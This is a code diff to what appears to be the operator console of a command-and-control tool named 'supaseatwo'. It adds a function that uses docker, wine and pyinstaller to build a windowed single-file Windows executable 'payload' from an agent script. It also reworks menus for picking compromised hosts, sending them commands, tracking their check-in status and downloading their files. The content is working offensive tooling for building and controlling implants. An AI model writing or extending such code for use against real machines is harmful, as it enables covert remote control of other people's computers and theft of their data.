@@ -4,6 +4,7 @@ import readline
 import os
 import threading
 from datetime import datetime, timedelta
+import subprocess  # Add this import for running shell commands
 
 # Import functions from the 'utils' package
 from utils import login
@@ -23,8 +24,8 @@ RESET = '\033[0m'
 
 # Command mappings for shortcuts
 command_mappings = {
-  # "psps": "powershell get-process",
-  # ... add more mappings as needed
+    # "psps": "powershell get-process",
+    # ... add more mappings as needed
 }
 
 # Default sleep interval and check-in threshold
@@ -121,6 +122,22 @@ def get_host_status(hostname):
         return response.data[0]['check_in']
     return 'Unknown'
 
+def generate_payload():
+    default_path = "/home/dan/dupa/supaseatwo/agent"
+    default_name = "supaseatwo"
+
+    path = input(f"Enter the path for the payload (default: {default_path}): ") or default_path
+    name = input(f"Enter the name for the payload (default: {default_name}): ") or default_name
+
+    command = f'docker run --rm -v "{path}":/app supaseatwo sh -c "mkdir -p /app/payload && wine pyinstaller --name {name} --onefile --windowed --noupx --icon /app/seatwo.ico --add-data \'/app/utils;utils\' /app/{name}.py && cp /dist/{name}.exe /app/payload"'
+
+    print(f"\n{YELLOW}Generating payload... This may take a few minutes.{RESET}")
+    try:
+        subprocess.run(command, shell=True, check=True)
+        print(f"{GREEN}Your payload '{name}' has been generated. You can find it in {path}/payload{RESET}")
+    except subprocess.CalledProcessError as e:
+        print(f"{RED}Failed to generate payload: {e}{RESET}")
+
 def main():
 
     print("\n                                               _                       ")
@@ -134,33 +151,53 @@ def main():
         print("Login failed or was cancelled.")
         return
 
-    hostname = select_hostname()
-
-    while hostname:
-        print(f"\nInteracting with '{GREEN}{hostname}{RESET}' with user '{username}'\n")
-        print("1. Interact")
-        print("2. Exit to Host Selection")
-        print("3. List Downloads")
-        print("4. Exit to Local Terminal")
+    while True:
+        print(f"\nLogged in as '{username}'\n")
+        print("1. Select Host")
+        print("2. Generate Payload")
+        print("3. Exit")
 
         choice = input("\nEnter your choice: ")
         try:
             choice = int(choice)
             if choice == 1:
-                send_command_and_get_output(hostname, username, command_mappings, current_sleep_interval)
-            elif choice == 2:
                 hostname = select_hostname()
+                if not hostname:
+                    break
+                while hostname:
+                    print(f"\nInteracting with '{GREEN}{hostname}{RESET}' with user '{username}'\n")
+                    print("1. Interact")
+                    print("2. Exit to Host Selection")
+                    print("3. List Downloads")
+                    print("4. Exit to Local Terminal")
+
+                    host_choice = input("\nEnter your choice: ")
+                    try:
+                        host_choice = int(host_choice)
+                        if host_choice == 1:
+                            send_command_and_get_output(hostname, username, command_mappings, current_sleep_interval)
+                        elif host_choice == 2:
+                            hostname = select_hostname()
+                        elif host_choice == 3:
+                            list_and_download_files(hostname)
+                        elif host_choice == 4:
+                            break
+                        else:
+                            print("Invalid choice. Please try again.")
+
+                        host_status = get_host_status(hostname)
+                        if host_status in ['dead', 'likely dead']:
+                            print(f"Host {hostname} is {host_status}. Selecting a new host.")
+                            hostname = select_hostname()
+                    except ValueError:
+                        print("Invalid input. Please enter a number.")
+            elif choice == 2:
+                generate_payload()
             elif choice == 3:
-                list_and_download_files(hostname)
-            elif choice == 4:
+                print("Exiting...")
                 break
             else:
                 print("Invalid choice. Please try again.")
-
-            host_status = get_host_status(hostname)
-            if host_status in ['dead', 'likely dead']:
-                print(f"Host {hostname} is {host_status}. Selecting a new host.")
-                hostname = select_hostname()
         except ValueError:
             print("Invalid input. Please enter a number.")
 
